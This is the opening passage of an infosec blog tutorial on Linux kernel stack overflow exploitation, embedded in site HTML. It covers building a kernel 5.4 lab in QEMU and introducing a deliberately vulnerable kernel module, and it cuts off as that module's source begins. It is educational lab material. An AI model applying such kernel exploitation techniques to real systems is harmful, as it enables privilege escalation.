@@ -1,0 +1,1706 @@
+
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>The Anatomy of the Linux Kernel Stack &middot; </title>
+  <meta name="title" content="The Anatomy of the Linux Kernel Stack &middot; " />
+  
+  <meta name="description" content="An awesome infosec blog :)" />
+  <meta name="keywords" content="Exploitation, Linux, Kernel, Stack, " />
+  
+  
+  <link rel="canonical" href="https://mutur4.github.io/posts/kernel-stack/" />
+  
+  <link rel="alternate" type="application/rss+xml" href="/posts/kernel-stack/index.xml" title="" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.fcb6b8f47fcf9d08dccf3e85cedee48f9dd6c0a0178e95c67a74e69f9f0588e77e10dd8d49c8f6d925fe24eb977a3c36f555f882737ae3f73d21fc10c8402b52.css"
+    integrity="sha512-/La49H/PnQjczz6Fzt7kj53WwKAXjpXGenTmn58FiOd&#43;EN2NScj22SX&#43;JOuXejw29VX4gnN64/c9IfwQyEArUg==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.d9c603046c077ebf0e88cb0cc75a77d795076c4f973750e71410c9e530eed5bd3b48204bb18b980da897cb9feb8371ec5cecb0056a738ddf4ab9ed2ac4b331bb.js"
+    integrity="sha512-2cYDBGwHfr8OiMsMx1p315UHbE&#43;XN1DnFBDJ5TDu1b07SCBLsYuYDaiXy5/rg3HsXOywBWpzjd9Kue0qxLMxuw=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.2021de190770621f45a1934d8a7bf9bae8420e3be8bd3e8b0409eeca15e2d25efd112c4c7276b4ab500db338c7afd272beea301310ad15bd98cbf94a9f3dead2.js"
+    integrity="sha512-ICHeGQdwYh9FoZNNinv5uuhCDjvovT6LBAnuyhXi0l79ESxMcna0q1ANszjHr9JyvuowExCtFb2Yy/lKnz3q0g==" data-copy="" data-copied=""></script>
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="The Anatomy of the Linux Kernel Stack" />
+<meta property="og:description" content="An awesome infosec blog :)" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://mutur4.github.io/posts/kernel-stack/" /><meta property="og:image" content="https://mutur4.github.io/posts/kernel-stack/featured.png"/>
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mutur4.github.io/posts/kernel-stack/featured.png"/>
+<meta name="twitter:title" content="The Anatomy of the Linux Kernel Stack"/>
+<meta name="twitter:description" content="An awesome infosec blog :)"/>
+
+  
+  
+
+  
+  
+  <meta name="author" content="BinaryChunk" />
+  
+  
+  
+  <link href="https://github.com/mutur4" rel="me" />
+  
+  
+  <link href="https://twitter.com/binarychunk" rel="me" />
+  
+  
+  <link href="mailto:8421gilbertrobert@gmail.com" rel="me" />
+  
+  
+  <link href="https://linkedin.com/in/gilbert-robert-m" rel="me" />
+  
+  
+  <link href="https://mastodon.social/@binarychunk" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script defer src="/lib/typeit/typeit.umd.js" integrity=""></script>
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    
+    
+    <div>
+        <a href="/" class="flex">
+            <span class="sr-only"></span>
+
+            <img src="/img/ffz.png" width="50" height="50"
+                class="max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="" />
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900"></a>
+
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12">
+
+            
+            
+            
+  <a href="/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+        Home
+    </p>
+</a>
+
+
+            
+            
+  <a href="/about/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="About Me">
+        About
+    </p>
+</a>
+
+
+            
+            
+  <a href="/ctfs/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="CTFs">
+        CTFs
+    </p>
+</a>
+
+
+            
+            
+  <a href="/posts/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Blog Posts">
+        Posts
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button">
+                    <div class="flex items-center justify-center h-12 dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden h-12 dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" style="margin-right:5px">
+                <div class="flex items-center justify-center h-12 dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden h-12 dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
+            Home
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="About Me">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/ctfs/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="CTFs">
+            CTFs
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Blog Posts">
+            Posts
+        </p>
+    </a>
+</li>
+
+
+
+                    
+                    
+
+                </ul>
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+
+
+
+
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/posts/kernel-stack/featured_huca62e8f2f77dc09f680df7536da2fce2_43986_1200x0_resize_box_3.png);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+ <header>
+  
+  <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      ></a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Blog Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/kernel-stack/"
+      >The Anatomy of the Linux Kernel Stack</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+  
+  <h1 class="mt-5 text-4xl font-extrabold text-neutral-900 dark:text-neutral">The Anatomy of the Linux Kernel Stack</h1>
+  <div class="mt-1 mb-2 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+</div>
+
+
+  </div>
+  </header>
+  <section class="mt-12 prose flex max-w-full flex-col dark:prose-invert lg:flex-row">
+    
+    <div class="order-first px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 lg:sticky lg:top-10">
+        <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#environment-setup">Environment Setup</a>
+      <ul>
+        <li><a href="#kernel">Kernel</a></li>
+        <li><a href="#configuration">Configuration</a></li>
+        <li><a href="#compilation">Compilation</a></li>
+      </ul>
+    </li>
+    <li><a href="#kernel-module">Kernel Module</a></li>
+    <li><a href="#file-system">File System</a>
+      <ul>
+        <li><a href="#passwd">Passwd</a></li>
+        <li><a href="#init-scripts">Init Scripts</a></li>
+      </ul>
+    </li>
+    <li><a href="#debugging">Debugging</a></li>
+    <li><a href="#stack-buffer-overflow">Stack Buffer Overflow</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#return-to-userland">Return-to-UserLand</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#environment-setup">Environment Setup</a>
+      <ul>
+        <li><a href="#kernel">Kernel</a></li>
+        <li><a href="#configuration">Configuration</a></li>
+        <li><a href="#compilation">Compilation</a></li>
+      </ul>
+    </li>
+    <li><a href="#kernel-module">Kernel Module</a></li>
+    <li><a href="#file-system">File System</a>
+      <ul>
+        <li><a href="#passwd">Passwd</a></li>
+        <li><a href="#init-scripts">Init Scripts</a></li>
+      </ul>
+    </li>
+    <li><a href="#debugging">Debugging</a></li>
+    <li><a href="#stack-buffer-overflow">Stack Buffer Overflow</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#return-to-userland">Return-to-UserLand</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+ 
+<script>
+  (function () {
+    var $toc = $('#TableOfContents');
+    if ($toc.length > 0) {
+      var $window = $(window);
+
+      function onScroll() {
+        var currentScroll = $window.scrollTop();
+        var h = $('.anchor');
+        var id = "";
+        h.each(function (i, e) {
+          e = $(e);
+          if (e.offset().top - $(window).height()/3 <= currentScroll) {
+            id = e.attr('id');
+          }
+        });
+        var active = $toc.find('a.active');      
+        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
+
+        active.each(function (i, e) {
+           
+            $(e).removeClass('active').siblings('ul').hide();
+          
+        });
+        $toc.find('a[href="#' + id + '"]').addClass('active')
+        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
+          $(e).children('a').parents('ul').show();          
+        });
+      }
+
+      $window.on('scroll', onScroll);
+      $(document).ready(function () {
+         
+          $toc.find('a').parent('li').find('ul').hide();
+        
+        onScroll();
+      });
+    }
+  })();
+</script>
+
+      </div>
+    </div>
+    
+    <div class="min-w-0 min-h-0 max-w-prose">
+      <hr>
+<div id="introduction" class="anchor"></div>
+<h2 class="relative group">Introduction 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a></span>        
+    
+</h2>
+
+<h3 id="typeit-1700981293389159131"></h3>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+      new TypeIt("#typeit-1700981293389159131", {
+        strings: ["","(From UserLand to KernelSpace)",""],
+        speed:  100 ,
+        lifeLike:  false ,
+        startDelay:  0 ,
+        breakLines:  true ,
+        waitUntilVisible:  true ,
+        loop:  false 
+      }).go();
+    });
+</script>
+<p>In the <code>Linux Kernel 'ring (0)'</code> a stack is also allocated for local variables defined in functions. These functions are mainly implemented for device drivers that are defined in different <strong>Loadable Kernel Modules</strong> (LKMs). The same stack is also vulnerable to stack overflow attacks that aim at overwriting the return address saved on the stack.</p>
+<p>In this post the following aspects will be covered:</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> Setting up a Kernel Debug Environment.</li>
+<li><input checked="" disabled="" type="checkbox"> A view of the Structure of the Stack in memory.</li>
+<li><input checked="" disabled="" type="checkbox"> Linux Kernel Stack Overflow Exploitation.</li>
+<li><input checked="" disabled="" type="checkbox"> Understand how the exploitation of the User-Land and the Kernel stack differs.</li>
+<li><input checked="" disabled="" type="checkbox"> Mitigations implemented to prevent the exploitation of Kernel Stack Overflows.</li>
+</ul>
+<div id="environment-setup" class="anchor"></div>
+<h2 class="relative group">Environment Setup 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#environment-setup" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>For the lab setup, the following will be required:</p>
+<ul>
+<li><code>qemu</code>: This will be used to emulate a chosen version of the Linux Kernel.</li>
+<li>A kernel bootable image that will be built from scratch.</li>
+<li>A vulnerable Kernel Module (<em>vulnerable to a Stack-Buffer Overflow vulnerability)</em>.</li>
+<li>A debugger (GDB) mostly without its plugins i.e <code>peda</code>, <code>gef</code></li>
+</ul>
+<div id="kernel" class="anchor"></div>
+<h3 class="relative group">Kernel 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#kernel" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>There are two options that can be used when emulating a Linux Kernel:</p>
+<ol>
+<li><strong>Building</strong> and <strong>compiling</strong> the Kernel from scratch.</li>
+<li>Using a default compiled kernel provided in the <code>/boot</code> folder.</li>
+</ol>
+<p>The process of building the Kernel provides more control since this allows us to even disable stack-cookies and other mitigations during compilation but this is not required for this post.</p>
+<p>The latest stable Kernel Version can be downloaded  from <a href="https://kernel.org"   target="_blank">
+    kernel.org</a>. At the time of writing, the latest version was <code>6.3.4</code> but for this post we will be using the Kernel Version <code>5.4.0</code> that can be downloaded from the following <code>URI</code> endpoint: <code>https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.4.tar.gz</code>.</p>
+<p>An archive with all the required files needed to build the Kernel will be downloaded.</p>
+
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    ><strong>Note</strong>: Any chosen Kernel Version can be used since the steps used to build the kernel will be the same.</span>
+</div>
+
+<div id="configuration" class="anchor"></div>
+<h3 class="relative group">Configuration 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#configuration" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>From the root folder <em>(will have the same name as the Kernel Version)</em> containing the extracted files, run the <code>make menuconfig</code> command. This will open up a configuration window as shown below, that can be used to set specific options before building the Kernel like <em>(<strong>enabling</strong> and <strong>disabling</strong> stack protection)</em>.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/yyOrupI.png" alt="" />
+    
+  </figure>
+
+</p>
+<p>The complete configuration is also described <a href="https://hackmag.com/coding/linux-kernel-exploitation/#:~:text=Commit_creds%20will%20grant%20the%20privileges"   target="_blank">
+    here</a></p>
+<div id="compilation" class="anchor"></div>
+<h3 class="relative group">Compilation 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#compilation" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>After the above configurations are set, the final bootable Kernel Image can be compiled with the following command:</p>
+<p><code>make -j &lt;threads&gt;</code>.</p>
+<p><code>threads</code> are the numbers of the threads that will be used to build the Kernel. Depending of the computation power of your current machine, the time used to compile the Kernel may differ accordingly. The compiled Kernel will be at <code>./arch/x86/boot/bzimage</code> in the root folder.</p>
+<p>There is a simple script provided <a href="https://github.com/mutur4/Linux-Kernel-Build-Scripts/blob/main/kernel-build.sh"   target="_blank">
+    here</a> to automate the Kernel build process a modified fork of <a href="https://github.com/pwncollege/pwnkernel/blob/main/build.sh"   target="_blank">
+    this</a>.</p>
+<div id="kernel-module" class="anchor"></div>
+<h2 class="relative group">Kernel Module 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#kernel-module" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>A Kernel Module is a piece of code that can be <strong>loaded</strong> and <strong>unloaded</strong> from the Kernel dynamically. These modules are written in <code>C</code> and therefore obviously vulnerable to memory corruption bugs; used to implement <strong>Kernel Drivers</strong>. The following is the code snippet for the vulnerable Kernel Module that will be used for the purpose of this post:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
